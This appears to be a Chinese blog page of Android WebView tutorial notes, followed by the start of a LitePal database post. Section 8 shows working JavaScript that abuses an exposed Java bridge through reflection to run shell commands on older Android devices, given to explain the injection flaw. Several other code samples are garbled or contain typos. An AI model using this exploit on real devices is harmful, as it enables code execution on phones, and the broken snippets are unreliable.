<h4 id="1、手动创建一个HttpThread类"><a href="#1、手动创建一个HttpThread类" class="headerlink" title="1、手动创建一个HttpThread类"></a>1、手动创建一个HttpThread类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String mUrl;</span><br><span class="line">	<span class="comment">//传递进来要下载的地址</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">HttpThread</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.mUrl=url;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">		   System.out.println(<span class="string">"开始下载"</span>);</span><br><span class="line">			URL httpUrl=<span class="keyword">new</span> URL(mUrl);</span><br><span class="line">			HttpURLConnection conn=(HttpURLConnection)httpUrl.openConnection();</span><br><span class="line">			conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">			conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">			<span class="comment">//输入流对象</span></span><br><span class="line">			InputStream in=conn.getInputStream();</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//输出流对象</span></span><br><span class="line">			OutputStream out;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//下载目录</span></span><br><span class="line">			File downloadFile;</span><br><span class="line">			File sdFile;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//判断SD卡是否已挂载</span></span><br><span class="line">			<span class="keyword">if</span>(Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))&#123;</span><br><span class="line">				downloadFile=Environment.getExternalStorageDirectory();</span><br><span class="line">				sdFile=<span class="keyword">new</span> File(downloadFile,<span class="string">"test.apk"</span>);</span><br><span class="line">				</span><br><span class="line">				out=<span class="keyword">new</span> FileOutputStream(sdFile);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">byte</span>[] b=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">6</span>*<span class="number">1024</span>];</span><br><span class="line">			<span class="keyword">int</span> len;</span><br><span class="line">			<span class="keyword">while</span>(len=in.read(b)!=-<span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(out!=<span class="keyword">null</span>)&#123;</span><br><span class="line">					out.write(b,<span class="number">0</span>,len);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(out!=<span class="keyword">null</span>)&#123;</span><br><span class="line">				out.close();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(in!=<span class="keyword">null</span>)&#123;</span><br><span class="line">				in.close();</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(<span class="string">"下载完成"</span>);</span><br><span class="line">			</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2、然后给webView实现DownloadListenr"><a href="#2、然后给webView实现DownloadListenr" class="headerlink" title="2、然后给webView实现DownloadListenr"></a>2、然后给webView实现DownloadListenr</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(<span class="string">"http://shouji.baidu.com"</span>);</span><br><span class="line"></span><br><span class="line">webView.setDownloadListener(<span class="keyword">new</span> MyDownload());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDownload</span> <span class="keyword">implements</span> <span class="title">DownloadListener</span></span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDownloadStart</span><span class="params">(String url,String userAgent,</span></span></span><br><span class="line"><span class="function"><span class="params">	String contentDisposition,String mimetype,<span class="keyword">long</span> contentLength)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//判断要下载的文件类型</span></span><br><span class="line">		<span class="keyword">if</span>(url.endWith(<span class="string">".apk"</span>))&#123;</span><br><span class="line">			<span class="keyword">new</span> HttpThread(url).start();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的话，如果页面中有下载的操作，就会按照我们的步骤执行了</p>
<h4 id="3、如何使用系统浏览器下载文件呢"><a href="#3、如何使用系统浏览器下载文件呢" class="headerlink" title="3、如何使用系统浏览器下载文件呢"></a>3、如何使用系统浏览器下载文件呢</h4><p>调用系统下载比较简单，也比较快</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDownload</span> <span class="keyword">implements</span> <span class="title">DownloadListener</span></span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDownloadStart</span><span class="params">(String url,String userAgent,</span></span></span><br><span class="line"><span class="function"><span class="params">	String contentDisposition,String mimetype,<span class="keyword">long</span> contentLength)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//判断要下载的文件类型</span></span><br><span class="line">		<span class="keyword">if</span>(url.endWith(<span class="string">".apk"</span>))&#123;</span><br><span class="line">			Uri uri=Uri.parse(url);</span><br><span class="line">			Intent intent=<span class="keyword">new</span> Intent(Intent.ACTION_VIEW,uri);</span><br><span class="line">			startActivity(intent);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="五、WebView的错误码处理"><a href="#五、WebView的错误码处理" class="headerlink" title="五、WebView的错误码处理"></a>五、WebView的错误码处理</h3><p>比如断网情况下加载一个页面，肯定会出现一个不太友好的页面，这样体验不好。常用的是加载一个本地的错误页面，或者一个native页面。怎么做呢</p>
<p><strong>只需要在webView的<code>setWebViewClient</code>监听中，重写<code>onReceiveError</code>方法即可</strong><br>首先需要在asserts目录下放置一个error.html文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> WebViewClent()&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view,String url)</span></span>&#123;</span><br><span class="line">		view.loadUrl(url);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(view , url);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceivedError</span><span class="params">(WebView view,<span class="keyword">int</span> errorCode,String description, String failingUrl)</span></span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onRecievedError(view,errorCode,description,failingUrl);</span><br><span class="line">		<span class="comment">//加载本地错误页面</span></span><br><span class="line">		view.loadUrl(<span class="string">"file:///android_asset/error.html"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>当然也可以将WebView控件隐藏，显示另一显示错误的控件。同样是在<code>onReceivedError</code>方法中处理</p>
<h3 id="六、WebView的同步cookie"><a href="#六、WebView的同步cookie" class="headerlink" title="六、WebView的同步cookie"></a>六、WebView的同步cookie</h3><p>1、首先创建一个HTTPCookie的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpCookie</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//用来向外传递信息</span></span><br><span class="line">	<span class="keyword">private</span> Handler handler;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">HttpCookie</span><span class="params">(tends Thread&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">private</span> )</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.handler=handler;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.run();</span><br><span class="line">		HttpClient client=<span class="keyword">new</span> DefaultHttpClient();</span><br><span class="line">		</span><br><span class="line">		HttpPost post=<span class="keyword">new</span> HttpPost(<span class="string">"192.168.1.102:8080/webs/loign"</span>);</span><br><span class="line">		List&lt;NameValuePair&gt; list=<span class="keyword">new</span> ArrayList&lt;NameValuePair&gt;();</span><br><span class="line">		list.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">"name"</span>,<span class="string">"wanger"</span>));</span><br><span class="line">		list.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">"age"</span>,<span class="number">12</span>));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			post.setEntity(<span class="keyword">new</span> UrlEncodeFromEntity(list));</span><br><span class="line">			HttpResponse response=client.execute(post);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(response.getStatusLine().getStatusCode()==<span class="number">200</span>)&#123;</span><br><span class="line">				AbstractHttpClient absClient=(AbstractHttpClient)client;</span><br><span class="line">				</span><br><span class="line">				List&lt;Cookie&gt; cookies=absClient.getCookieStore().getCookies();</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span>(Cookie cookie :cookies)&#123;</span><br><span class="line">					System.out.println(<span class="string">"name="</span>+cookie.getName()+<span class="string">"age="</span>+cookie.getValue);</span><br><span class="line">					</span><br><span class="line">					Message message=<span class="keyword">new</span> Message();</span><br><span class="line">					message.obj=cookie;</span><br><span class="line">					handler.sendMessage(message);</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、然后在MainActivity中相应的地方添加 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Handler handler=<span class="keyword">new</span> Handler()&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handlerMessage</span><span class="params">(android.os.Message msg)</span></span>&#123;</span><br><span class="line">		String cookie=msg.obj.toString();</span><br><span class="line">		</span><br><span class="line">		CookieSyncManager.createInstance(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">		CookieManager cookieManager=CookieManager.getInstance();</span><br><span class="line">		cookieManager.setAcceptCookie(<span class="keyword">true</span>);</span><br><span class="line">		cookieManager.setCookie(<span class="string">"http://192.168.1.102:8080"</span>,cookie);</span><br><span class="line">		CookieSyncManager.getInstance().sync();</span><br><span class="line">		</span><br><span class="line">		webView.loadUrl(<span class="string">"192.168.1.102:8080/webs/index.html"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> HttpCookie(handler).start();</span><br></pre></td></tr></table></figure>
<h3 id="七、WebView与JS调用混淆问题"><a href="#七、WebView与JS调用混淆问题" class="headerlink" title="七、WebView与JS调用混淆问题"></a>七、WebView与JS调用混淆问题</h3><p>正常情况下WebView和JS是可以互相调用的，到那时当把apk发布时需要一个release包，而release包通常需要混淆处理，就会发生WebView与JS无法调用。<br>比如<br>1、创建一个类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebHost</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Context context;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">WebHost</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.context=context;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callJs</span><span class="params">()</span></span>&#123;</span><br><span class="line">		Toast.makeText(context,<span class="string">"call form js"</span>,Toast.LENGTH_LONG);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、然后在MainActivity中添加</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webView.getSetting().setJavaScriptEnable(<span class="keyword">true</span>);</span><br><span class="line">webView.addJavaScriptInterface(<span class="keyword">new</span> WebHost(<span class="keyword">this</span>),<span class="string">"js"</span>);</span><br></pre></td></tr></table></figure>
<p>3、最后在html页面中添加一个js方法,并给某个按钮添加监听</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	js.callJs();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时运行app是可以正常调用js的方法的，但是对代码混淆后，却发现不能用了，这时需要在混淆配置文件中将相应的类添加进入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-keep public class com.example.webview01.WebHost&#123;</span><br><span class="line">	public &lt;methods&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这时混淆后的代码就可以正常执行了 </p>
<h3 id="八、WebView导致的远程注入问题"><a href="#八、WebView导致的远程注入问题" class="headerlink" title="八、WebView导致的远程注入问题"></a>八、WebView导致的远程注入问题</h3><p>如果通过恶意代码从web页面拿到手机上的照片等信息，会很危险。4.2之后已修复。<br>如下面的js代码，遍历js对象，拿到映射的java对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>)&#123;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="string">"getClass"</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj])&#123;</span><br><span class="line">				<span class="keyword">try</span>&#123;</span><br><span class="line">					<span class="built_in">window</span>[obj].getClass();</span><br><span class="line">					<span class="built_in">document</span>.write(<span class="string">'&lt;span style="color:red;font-size:22px"&gt;'</span></span><br><span class="line">					+obj+<span class="string">'&lt;/span&gt;'</span>);</span><br><span class="line">					<span class="built_in">document</span>.write(<span class="string">'&lt;br /&gt;'</span>);</span><br><span class="line">				&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射加载一个Runtime类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">cmdArgs</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> searchBoxJavaBridge_.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	execute([<span class="string">"/system/bin/sh"</span>,<span class="string">"-c"</span>,</span><br><span class="line">	<span class="string">"ls /mnt/scdcard &gt; /sdcard/log-netstat.txt"</span>]);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">	alert(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="九、WebView自定义拦截"><a href="#九、WebView自定义拦截" class="headerlink" title="九、WebView自定义拦截"></a>九、WebView自定义拦截</h3><p>虽然有些浏览器厂商已经解决了远程注入的问题，但是作为开发人员也因该减少与js的调用，并且设置一定的规则。<br>通常情况下需要定义协议，让js来打开本地客户端<br>例如要通过js启动一个新的activity<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"http://192.168.1.102:8080/webs/error.html?startActivity"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后在ManiActivity中进行拦截</p>
<pre><code class="Java">webView.setWebViewClient(<span class="keyword">new</span> WebViewClent(){
    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view,String url)</span></span>{

        <span class="comment">//根据协议来启动新的activity</span>
        <span class="keyword">if</span>(url.endWith(<span class="string">"?startActivity"</span>)){
            Intent intent=<span class="keyword">new</span> Intent(ManiActivity.<span class="keyword">this</span>,SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;
            startActivity(intent);
            <span class="keyword">return</span> <span class="keyword">true</span>;
        }
        view.loadUrl(url);
        <span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(view , url);
    }



});

</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/24/android-webview/" data-id="ck55it3mf002wcglrrac10l9x" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-android-litepal" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/24/android-litepal/" class="article-date">
  <time datetime="2018-01-24T12:58:43.000Z" itemprop="datePublished">2018-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/24/android-litepal/">Android数据持久化---LitePal</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>记得很久之前就使用过一些第三方工具进行sqlite数据库操作，只觉得分外简单。入职以来进行了SpringBoot等的训练，发现它们所做的工作如此之像，一精则百通吧，现在看这本书，笔记还是继续做吧，梳理一下才是自己的东西。</p>
<h3 id="一、LitePal创建数据库"><a href="#一、LitePal创建数据库" class="headerlink" title="一、LitePal创建数据库"></a>一、LitePal创建数据库</h3><h5 id="1-1-添加依赖"><a href="#1-1-添加依赖" class="headerlink" title="1.1 添加依赖"></a>1.1 添加依赖</h5><p>在相应module的<code>build.gradle</code>的dependencies中添加依赖引用：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dependencies&#123;</span><br><span class="line">  	<span class="comment">//...</span></span><br><span class="line">  	compile <span class="string">'org.litepal.android:core:1.4.1'</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="1-2-添加配置文件"><a href="#1-2-添加配置文件" class="headerlink" title="1.2 添加配置文件"></a>1.2 添加配置文件</h5><p>在<code>src/main</code>目录下新建一个<code>assets</code>的目录，然后在下面新建一个litepal.xml的文件，添加内容如下：</p>
<p>其中</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"&gt;</span></span><br><span class="line"><span class="meta">&lt;litepal&gt;</span></span><br><span class="line"><span class="meta">	&lt;!--数据库名称--&gt;</span></span><br><span class="line"><span class="meta">	&lt;dbname value="BookStore"&gt;&lt;/dbname&gt;</span></span><br><span class="line"><span class="meta">	&lt;!--数据库版本--&gt;</span></span><br><span class="line"><span class="meta">	&lt;version value="1"&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="meta">	</span></span><br><span class="line"><span class="meta">	&lt;!--数据库的表对应的类--&gt;</span></span><br><span class="line"><span class="meta">	&lt;list&gt;</span></span><br><span class="line"><span class="meta">	&lt;/list&gt;</span></span><br><span class="line"><span class="meta">&lt;/litepal&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="1-3-配置AndroidManifest-xml文件"><a href="#1-3-配置AndroidManifest-xml文件" class="headerlink" title="1.3 配置AndroidManifest.xml文件"></a>1.3 配置AndroidManifest.xml文件</h5><p> 在AndroidManifest.xml中的application标签中添加一个name属性</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">package</span>=<span class="string">"com.example.litepaltest"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">  		<span class="attr">android:name</span>=<span class="string">"org.litepal.LitePalApplication"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportRtl</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></span><br><span class="line">    	...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="1-4-创建对象类"><a href="#1-4-创建对象类" class="headerlink" title="1.4 创建对象类"></a>1.4 创建对象类</h5><p>LitePal采取的是对象关系映射（ORM）模式，将面向对象语言与面向关系的数据库之间建立一种映射关系。我们只需要创建一个实体类，LitePal就可以将它转变成数据库中的表。</p>
<p>创建一个Book的实体类：</p>
<p>Book类会对应数据库中的Book表，类中的字段对应表中的列。这就是关系对象映射。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">  	<span class="keyword">private</span> String author;</span><br><span class="line">  	<span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line">  	<span class="keyword">private</span> <span class="keyword">int</span> pages;</span><br><span class="line">  	<span class="keyword">private</span> String name;</span><br><span class="line">  </span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
